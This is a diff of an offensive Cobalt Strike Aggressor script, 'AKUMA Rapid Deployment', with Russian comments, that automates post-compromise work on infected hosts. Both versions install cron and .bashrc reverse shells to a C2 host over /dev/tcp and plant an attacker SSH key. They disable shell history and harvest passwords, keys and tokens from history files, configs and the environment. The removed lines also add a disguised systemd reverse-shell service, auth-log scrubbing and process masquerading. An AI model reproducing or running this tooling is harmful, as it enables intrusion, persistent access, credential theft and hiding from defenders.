@@ -1,59 +1,75 @@
-# AKUMA's Rapid Deployment Suite
-# Быстрое развертывание всех post-exploitation механизмов одной кнопкой
+# AKUMA's Rapid Deployment Script
+# Быстрое развертывание persistence и lateral movement после compromise
 
-# Конфигурация для rapid deployment
-global('%rapid_config');
-%rapid_config["c2_server"] = "192.168.1.17";
-%rapid_config["backup_ports"] = @("4444", "5555", "6666", "7777", "8888", "9999");
-%rapid_config["ssh_key"] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VjXqGq1pF8K3J9j2M5+QrP3fF7e8A9fE2c1vG8H4N5M6L7akuma@c2";
+# ========== CONFIGURATION ==========
+%rapid_config = %(
+    "c2_server" => "192.168.1.100",
+    "backup_ports" => @(4444, 5555, 6666, 7777, 8888),
+    "ssh_key" => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7...", # Your SSH public key here
+    "scan_timeout" => 30,
+    "max_hosts" => 20
+);
 
-# Добавляем в контекстное меню
+# ========== MAIN MENU ==========
 popup beacon_bottom {
-    menu "🚀 AKUMA Rapid Deploy" {
-        item "⚡ Full Auto PostEx (5 min)" {
-            akuma_rapid_full($1);
-        }
-        item "🎯 Quick Foothold (2 min)" {
+    menu "🔥 AKUMA Rapid Deployment" {
+        item "⚡ Quick Foothold (2min)" {
             akuma_rapid_quick($1);
+        }
+        item "🎯 Full Deployment (5min)" {
+            akuma_rapid_full($1);
         }
         item "🔒 Persistence Only" {
             akuma_rapid_persistence($1);
         }
-        item "🧹 Emergency Cleanup" {
-            akuma_emergency_cleanup($1);
+        item "🔍 Network Recon" {
+            akuma_rapid_network($1);
+        }
+        item "🔐 Credential Harvest" {
+            akuma_rapid_credentials($1);
+        }
+        separator();
+        menu "⚙️ Configuration" {
+            item "📝 Set C2 Server IP" {
+                prompt_text("C2 Server IP:", %rapid_config["c2_server"], closure {
+                    %rapid_config["c2_server"] = $2;
+                    show_message("C2 Server updated to: " . $2);
+                });
+            }
+            item "🔧 Set SSH Key" {
+                prompt_text("SSH Public Key:", %rapid_config["ssh_key"], closure {
+                    %rapid_config["ssh_key"] = $2;
+                    show_message("SSH Key updated!");
+                });
+            }
+            item "ℹ️ Show Current Config" {
+                $msg = "🔥 AKUMA Configuration:\n";
+                $msg .= "C2 Server: " . %rapid_config["c2_server"] . "\n";
+                $msg .= "Backup Ports: " . join(", ", %rapid_config["backup_ports"]) . "\n";
+                $msg .= "SSH Key: " . substr(%rapid_config["ssh_key"], 0, 50) . "...\n";
+                show_message($msg);
+            }
         }
     }
 }
+
+# ========== MAIN DEPLOYMENT FUNCTIONS ==========
 
 sub akuma_rapid_full {
     local('$bid');
     $bid = $1;
     
-    blog($bid, "🚀 AKUMA Rapid Full Deployment Starting...");
+    blog($bid, "🔥 AKUMA Full Deployment Starting...");
     blog($bid, "⏱️ Estimated time: 5 minutes");
     
-    # PHASE 1: Immediate stabilization
-    blog($bid, "📍 PHASE 1: Immediate Stabilization");
+    # Полное развертывание
     akuma_deploy_stabilization($bid);
-    
-    # PHASE 2: Quick enumeration
-    blog($bid, "📍 PHASE 2: System Enumeration");
     akuma_deploy_enumeration($bid);
-    
-    # PHASE 3: Multiple persistence mechanisms
-    blog($bid, "📍 PHASE 3: Persistence Deployment");
     akuma_deploy_persistence($bid);
-    
-    # PHASE 4: Credential harvesting
-    blog($bid, "📍 PHASE 4: Credential Harvesting");
     akuma_deploy_credential_harvest($bid);
-    
-    # PHASE 5: Network discovery
-    blog($bid, "📍 PHASE 5: Network Discovery");
     akuma_deploy_network_recon($bid);
     
-    blog($bid, "✅ AKUMA Rapid Full Deployment Complete!");
-    blog($bid, "🎉 System fully compromised and persistent!");
+    blog($bid, "✅ AKUMA Full Deployment Complete!");
 }
 
 sub akuma_rapid_quick {
@@ -80,6 +96,24 @@ sub akuma_rapid_persistence {
     blog($bid, "✅ All persistence mechanisms deployed!");
 }
 
+sub akuma_rapid_network {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🌐 AKUMA Network Reconnaissance...");
+    akuma_deploy_network_recon($bid);
+    blog($bid, "✅ Network reconnaissance complete!");
+}
+
+sub akuma_rapid_credentials {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔐 AKUMA Credential Harvesting...");
+    akuma_deploy_credential_harvest($bid);
+    blog($bid, "✅ Credential harvesting complete!");
+}
+
 # ========== DEPLOYMENT PHASES ==========
 
 sub akuma_deploy_stabilization {
@@ -88,40 +122,19 @@ sub akuma_deploy_stabilization {
     
     blog($bid, "🛡️ Deploying stabilization measures...");
     
-    # Создаем полный скрипт стабилизации
-    $stabilization_script = "#!/bin/bash
-# AKUMA Stabilization Phase
-echo '🛡️ AKUMA STABILIZATION STARTING'
-
-# Backup critical files
-mkdir -p /tmp/.akuma_backup 2>/dev/null
-cp /etc/passwd /tmp/.akuma_backup/passwd.orig 2>/dev/null
-cp /etc/shadow /tmp/.akuma_backup/shadow.orig 2>/dev/null
-cp /etc/sudoers /tmp/.akuma_backup/sudoers.orig 2>/dev/null
-crontab -l > /tmp/.akuma_backup/cron.orig 2>/dev/null
-
-# Disable history
-export HISTFILE=/dev/null
-unset HISTFILE
-history -c
-
-# Create working directory
-mkdir -p /tmp/.akuma 2>/dev/null
-chmod 755 /tmp/.akuma
-
-# Test network connectivity
-ping -c 1 " . %rapid_config["c2_server"] . " >/dev/null 2>&1 && echo 'C2 connectivity: OK' || echo 'C2 connectivity: FAILED'
-
-# Process information
-echo \"Current process: \$\$\"
-echo \"Current user: \$(whoami)\"
-echo \"Current directory: \$(pwd)\"
-echo \"Shell: \$SHELL\"
-
-echo '✅ Stabilization complete'
-";
-
-    bshell($bid, $stabilization_script);
+    # Отключаем историю и создаем рабочую директорию
+    bshell($bid, "export HISTFILE=/dev/null && unset HISTFILE && history -c");
+    bshell($bid, "mkdir -p /tmp/.akuma 2>/dev/null && chmod 755 /tmp/.akuma");
+    
+    # Создаем backup критичных файлов
+    bshell($bid, "mkdir -p /tmp/.akuma_backup 2>/dev/null");
+    bshell($bid, "cp /etc/passwd /tmp/.akuma_backup/passwd.orig 2>/dev/null");
+    bshell($bid, "crontab -l > /tmp/.akuma_backup/cron.orig 2>/dev/null");
+    
+    # Тестируем связность с C2
+    bshell($bid, "ping -c 1 " . %rapid_config["c2_server"] . " >/dev/null 2>&1 && echo 'C2 connectivity: OK' || echo 'C2 connectivity: FAILED'");
+    
+    blog($bid, "✅ Stabilization complete!");
 }
 
 sub akuma_deploy_enumeration {
@@ -130,36 +143,22 @@ sub akuma_deploy_enumeration {
     
     blog($bid, "🔍 Deploying enumeration...");
     
-    $enum_script = "#!/bin/bash
-echo '🔍 AKUMA ENUMERATION PHASE'
-
-# System information
-echo '=== SYSTEM INFO ==='
-hostname && whoami && id
-uname -a
-cat /etc/os-release 2>/dev/null || cat /etc/issue
-
-# Network information
-echo '=== NETWORK INFO ==='
-ip addr show 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1'
-ip route 2>/dev/null | head -5
-
-# Running processes
-echo '=== KEY PROCESSES ==='
-ps aux --sort=-%cpu | head -10
-
-# Network connections
-echo '=== NETWORK CONNECTIONS ==='
-ss -tlnp 2>/dev/null | head -10
-
-# Users
-echo '=== USERS ==='
-cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$' | head -10
-
-echo '✅ Enumeration complete'
-";
-
-    bshell($bid, $enum_script);
+    bshell($bid, "echo '=== AKUMA SYSTEM INFO ==='");
+    bshell($bid, "hostname && whoami && id");
+    bshell($bid, "uname -a");
+    bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
+    
+    bshell($bid, "echo '=== NETWORK INFO ==='");
+    bshell($bid, "ip addr show 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1'");
+    bshell($bid, "ip route 2>/dev/null | head -5");
+    
+    bshell($bid, "echo '=== KEY PROCESSES ==='");
+    bshell($bid, "ps aux --sort=-%cpu | head -10");
+    
+    bshell($bid, "echo '=== USERS ==='");
+    bshell($bid, "cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$' | head -10");
+    
+    blog($bid, "✅ Enumeration complete!");
 }
 
 sub akuma_deploy_persistence {
@@ -170,9 +169,9 @@ sub akuma_deploy_persistence {
     
     blog($bid, "🔒 Deploying multiple persistence mechanisms...");
     
-    # Cron persistence
-    bshell($bid, "(crontab -l 2>/dev/null; echo \"*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1'\") | crontab -");
-    bshell($bid, "(crontab -l 2>/dev/null; echo \"@reboot sleep 60 && /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1'\") | crontab -");
+    # Cron persistence - основной и backup
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1\"') | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1\"') | crontab -");
     
     # SSH key persistence
     $ssh_key = %rapid_config["ssh_key"];
@@ -180,44 +179,40 @@ sub akuma_deploy_persistence {
     
     # Profile persistence
     bshell($bid, "echo 'export HISTFILE=/dev/null' >> ~/.bashrc");
-    bshell($bid, "echo '[ $$ -eq 1 ] || nohup /bin/bash -c \"sleep $((RANDOM % 1800)) && /bin/bash -c \\\"bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1\\\"\" >/dev/null 2>&1 &' >> ~/.bashrc");
     
-    # System-wide persistence (if root)
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo \"*/20 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . @ports[3] . " 0>&1'\" >> /etc/crontab; fi");
-    
-    # Service persistence (if root)
-    $service_content = "[Unit]
-Description=System Monitor Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'while true; do sleep 600; /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[4] . " 0>&1\" 2>/dev/null; done'
-Restart=always
-User=nobody
-
-[Install]
-WantedBy=multi-user.target";
-
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then cat > /etc/systemd/system/system-monitor.service << 'EOF'\n" . $service_content . "\nEOF; systemctl enable system-monitor.service 2>/dev/null; systemctl start system-monitor.service 2>/dev/null; fi");
+    # System-wide persistence (если root)
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/20 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[3] . " 0>&1\"' >> /etc/crontab; fi");
     
     blog($bid, "✅ Multiple persistence mechanisms deployed!");
 }
 
 sub akuma_deploy_quick_persistence {
-    local('$bid', '$server', '$port1', '$port2');
+    local('$bid', '$server', '$port1');
     $bid = $1;
     $server = %rapid_config["c2_server"];
     $port1 = %rapid_config["backup_ports"][0];
-    $port2 = %rapid_config["backup_ports"][1];
     
     blog($bid, "⚡ Deploying quick persistence...");
     
     # Только самые быстрые методы
-    bshell($bid, "(crontab -l 2>/dev/null; echo \"*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/" . $server . "/" . $port1 . " 0>&1'\") | crontab -");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port1 . " 0>&1\"') | crontab -");
     bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . %rapid_config["ssh_key"] . "' >> ~/.ssh/authorized_keys 2>/dev/null");
     
     blog($bid, "✅ Quick persistence deployed!");
+}
+
+sub akuma_deploy_quick_enum {
+    local('$bid');
+    $bid = $1;
+    
+    blog($bid, "🔍 Quick enumeration...");
+    
+    bshell($bid, "echo '=== QUICK SYSTEM CHECK ==='");
+    bshell($bid, "whoami && hostname && uname -r");
+    bshell($bid, "ps aux --sort=-%cpu | head -5");
+    bshell($bid, "ss -tlnp 2>/dev/null | head -5");
+    
+    blog($bid, "✅ Quick enumeration complete!");
 }
 
 sub akuma_deploy_credential_harvest {
@@ -226,30 +221,26 @@ sub akuma_deploy_credential_harvest {
     
     blog($bid, "🔐 Deploying credential harvesting...");
     
-    $cred_harvest = "#!/bin/bash
-echo '🔐 AKUMA CREDENTIAL HARVEST'
-
-# History files
-echo '=== COMMAND HISTORY SECRETS ==='
-cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20
-cat ~/.zsh_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20
-
-# SSH keys
-echo '=== SSH KEYS ==='
-find /home -maxdepth 3 -name 'id_*' -o -name '*.pem' 2>/dev/null | head -10
-
-# Config files with passwords
-echo '=== CONFIG FILES ==='
-find /home -maxdepth 3 -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10
-
-# Environment variables
-echo '=== ENVIRONMENT SECRETS ==='
-env | grep -i 'pass\\|secret\\|key\\|token' 2>/dev/null
-
-echo '✅ Credential harvest complete'
-";
-
-    bshell($bid, $cred_harvest);
+    bshell($bid, "echo '=== AKUMA CREDENTIAL HARVEST ==='");
+    
+    # History files
+    bshell($bid, "echo '=== COMMAND HISTORY SECRETS ==='");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
+    bshell($bid, "cat ~/.zsh_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
+    
+    # SSH keys
+    bshell($bid, "echo '=== SSH KEYS ==='");
+    bshell($bid, "find /home -maxdepth 3 -name 'id_*' -o -name '*.pem' 2>/dev/null | head -10");
+    
+    # Config files with passwords
+    bshell($bid, "echo '=== CONFIG FILES ==='");
+    bshell($bid, "find /home -maxdepth 3 -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
+    
+    # Environment variables
+    bshell($bid, "echo '=== ENVIRONMENT SECRETS ==='");
+    bshell($bid, "env | grep -i 'pass\\|secret\\|key\\|token' 2>/dev/null");
+    
+    blog($bid, "✅ Credential harvest complete!");
 }
 
 sub akuma_deploy_network_recon {
@@ -258,147 +249,21 @@ sub akuma_deploy_network_recon {
     
     blog($bid, "🌐 Deploying network reconnaissance...");
     
-    $network_recon = "#!/bin/bash
-echo '🌐 AKUMA NETWORK RECON'
-
-# Network interfaces
-echo '=== NETWORK INTERFACES ==='
-ip addr show 2>/dev/null | grep -E 'inet |state UP'
-
-# Routes
-echo '=== ROUTES ==='
-ip route 2>/dev/null
-
-# ARP table
-echo '=== ARP TABLE ==='
-arp -a 2>/dev/null | head -20
-
-# Open ports
-echo '=== LOCAL OPEN PORTS ==='
-ss -tlnp 2>/dev/null | head -10
-
-# Network connections
-echo '=== ESTABLISHED CONNECTIONS ==='
-ss -anp 2>/dev/null | grep ESTABLISHED | head -10
-
-echo '✅ Network recon complete'
-";
-
-    bshell($bid, $network_recon);
+    # Быстрое сканирование сети
+    bshell($bid, "echo '=== NETWORK DISCOVERY ==='");
+    bshell($bid, "ip route 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}' | grep '/' | head -5");
+    bshell($bid, "arp -a 2>/dev/null | head -10");
+    
+    # Поиск живых хостов в локальной сети
+    bshell($bid, "echo '=== PING SWEEP ==='");
+    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo \"192.168.1.$i is alive\"; done");
+    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo \"10.0.0.$i is alive\"; done");
+    
+    # Проверка открытых портов на localhost
+    bshell($bid, "echo '=== LOCAL SERVICES ==='");
+    bshell($bid, "ss -tlnp 2>/dev/null | grep LISTEN | head -15");
+    
+    blog($bid, "✅ Network reconnaissance complete!");
 }
 
-sub akuma_deploy_quick_enum {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "⚡ Quick enumeration...");
-    
-    bshell($bid, "echo '⚡ AKUMA QUICK ENUM' && whoami && hostname && uname -a && id");
-    bshell($bid, "ps aux --sort=-%cpu | head -5");
-    bshell($bid, "ss -tlnp 2>/dev/null | head -5");
-}
-
-sub akuma_emergency_cleanup {
-    local('$bid');
-    $bid = $1;
-    
-    blog($bid, "🧹 AKUMA Emergency Cleanup Starting...");
-    
-    $cleanup_script = "#!/bin/bash
-echo '🧹 AKUMA EMERGENCY CLEANUP'
-
-# Clear command history
-history -c
-unset HISTFILE
-export HISTFILE=/dev/null
-> ~/.bash_history 2>/dev/null
-> ~/.zsh_history 2>/dev/null
-
-# Remove temporary files
-rm -rf /tmp/.akuma* 2>/dev/null
-rm -rf /tmp/.*akuma* 2>/dev/null
-
-# Clear logs (if writable)
-if [ -w /var/log/auth.log ]; then
-    sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null
-fi
-if [ -w /var/log/secure ]; then
-    sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null
-fi
-
-# Process masquerading
-exec -a 'systemd-user' bash
-
-echo '✅ Emergency cleanup complete'
-";
-
-    bshell($bid, $cleanup_script);
-    
-    blog($bid, "✅ Emergency cleanup complete!");
-}
-
-# One-click menu в главном меню
-menubar("AKUMA Rapid", "rapid", 1);
-
-popup rapid {
-    menu "🚀 AKUMA Rapid Deploy" {
-        item "⚡ Auto Deploy All Beacons" {
-            akuma_deploy_all_beacons();
-        }
-        item "📊 Show Deployment Status" {
-            akuma_show_deployment_status();
-        }
-        item "🔧 Configure C2 Settings" {
-            akuma_configure_settings();
-        }
-    }
-}
-
-sub akuma_deploy_all_beacons {
-    local('@beacons', '$beacon');
-    @beacons = beacons();
-    
-    println("🚀 AKUMA: Deploying to all " . size(@beacons) . " beacons...");
-    
-    foreach $beacon (@beacons) {
-        if (beacon_info($beacon, "alive") eq "true") {
-            blog($beacon, "🚀 AKUMA Auto-deployment starting...");
-            akuma_rapid_full($beacon);
-        }
-    }
-    
-    println("✅ AKUMA: Deployment complete on all active beacons!");
-}
-
-sub akuma_show_deployment_status {
-    local('@beacons', '$beacon', '$info');
-    @beacons = beacons();
-    
-    println("📊 AKUMA Deployment Status:");
-    println("=" x 50);
-    
-    foreach $beacon (@beacons) {
-        $info = beacon_info($beacon, "computer") . "@" . beacon_info($beacon, "user");
-        if (beacon_info($beacon, "alive") eq "true") {
-            println("✅ " . $info . " - ONLINE");
-        } else {
-            println("❌ " . $info . " - OFFLINE");
-        }
-    }
-}
-
-sub akuma_configure_settings {
-    println("🔧 AKUMA Configuration:");
-    println("C2 Server: " . %rapid_config["c2_server"]);
-    println("Backup Ports: " . join(", ", %rapid_config["backup_ports"]));
-    println("SSH Key configured: YES");
-}
-
-# Загрузка скрипта
-println("🚀 AKUMA Rapid Deployment Suite Loaded!");
-println("   ⚡ Full Auto PostEx - Complete compromise in 5 minutes");
-println("   🎯 Quick Foothold - Basic persistence in 2 minutes");
-println("   🔒 Multiple persistence mechanisms available");
-println("   🧹 Emergency cleanup capabilities");
-println("   📊 Multi-beacon deployment support");
-println("   🔥 Ready for rapid domination!");
+blog("🔥 AKUMA Rapid Deployment Script Loaded! Use right-click menu on beacon.");
